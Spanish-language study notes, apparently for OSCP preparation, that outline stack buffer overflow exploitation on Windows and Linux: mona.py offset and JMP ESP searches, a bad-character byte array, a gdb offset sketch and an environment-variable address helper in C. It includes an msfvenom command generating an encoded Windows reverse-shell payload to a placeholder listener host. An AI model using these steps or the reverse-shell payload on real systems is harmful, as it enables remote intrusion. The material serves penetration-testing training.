# Buffer Overflow

## Windows

### OSCP Metodología Stack Based

#### Fuzzing

En esta sección se realiza la búsqueda del punto de quiebre del binario. Identificando el número de caracteres que causen un fallo de segmentación.

**Generacion de patrón**

`!mona pattern_create <num>`

Después de provocar el fallo con el patrón, la dirección `EIP` se sustituiría con un valor del segmento de nuestro patrón. El valor que contenga `EIP` ahora lo identificaremos para saber el offset específico.

TODO: Agregar imagen de evidencia

**Identificación offset**

`!mona pattern_offset <eip>`

TODO: Agregar imagen

1. Offset.
2. EIP.

*Nota: Siempre corroborar con un payload propio modificando después del offset un valor que se identifique facilmente.*

#### Identificar Bad Chars

**Manual**

TODO: Agregar evidencia de proceso manual

**Semi-automático**

TODO: Buscar comandos automáticos de mona

`!mona bytearray`

**Plano**

`\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff`

**Arreglo**

```python
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

#### Búsqueda de dirección

Aquí se realiza la búsqueda de la instrucción `JMP ESP` (valores hexadecimales `\xff\xe4`).

Búsqueda de dlls que contengan el `JMP ESP`, siempre tratando de identificar aquellas que no cuenten con protecciones (todas la banderas dadas por `mona.py` en `False`).

**Comando de mona.py**

`!mona modules`

**Ejemplo**

TODO: Agregar imagen

##### Búsqueda de apuntador en dll

Aquí se realiza una búsqueda de los apuntadores contenidos en la dll identificada con el valor de la instrucción `\xff\xe4`.

**Comando de mona.py**

`!mona find -s "\xff\xe4" -m <nombre de dll>`

Se desplegará una lista de direcciones de memoria que se pudieran utilizar, sin antes considerar 2 cosas. La descripción de la tabla contenerá direcciones con permisos de lectura y ejecución (`PAGE_EXECUTE_READ`); y de escritura solamente (`PAGE_READ_ONLY`), **hay que tomar en cuenta sólo aquellas que cuenten con ejecución** (`PAGE_EXECUTE_READ`). Y también desplegará las protecciones con las que cuenta la dll, tomar de nuevo en cuenta aquellas que tengan todo deshabilitado (`False`).

TODO: Poner imagen mona_find_2.png

1. Comando.
2. Direcciones útiles para usar en EIP.
3. Permisos.
4. Protecciones.

#### Generación de shellcode

Aquí se generará el shellcode a utilizar después de la sustitución del valor que se asigne a la `EIP`.

**Comando de ejemplo**

`msfvenom -a x86 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=<ip> LPORT=<puerto> -b '\x00' EXITFUNC=THREAD -i 3 -f python > scode.txt`

Tener en consideración:
- Sistema operativo.
- Arquitectura.
- Payload.
- Formato (python, c, exe, etc).
- Variables de escucha o comando a ejecutar.
- Encoding (extra: `-i 3` para número de iteraciones para encodear).
- BadChars.
- Función de salida (para evitar que el proceso termine `SEH` `THREAD`).


## Linux

Usualmente el llamar directamente a la pila no retorna una shell, por lo que hay que buscar instrucciones de tipo `jmp` y `call`, pudiendo hacer un filtrado de estas instrucciones con `grep`. Ejemplo: `objdump -d [binario] | grep jmp`. Teniendo en cuenta que deberían apuntar a los ROP Gadgets ya sea de 32 o 64 bits respectivamente.

Sacar offset en gdb

Setear breakpoint antes de que termine el programa

info frame

x/24wx $rsp

p/d rip - rsp


## Script de exploit base

## Tips n' tricks


```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char *ptr;

   if(argc < 3) {
      printf("Usage: %s <environment var> <target program name>\n", argv[0]);
      exit(0);
   }
   ptr = getenv(argv[1]); /* Get env var location. */
   ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
   printf("%s will be at %p\n", argv[1], ptr);
}
```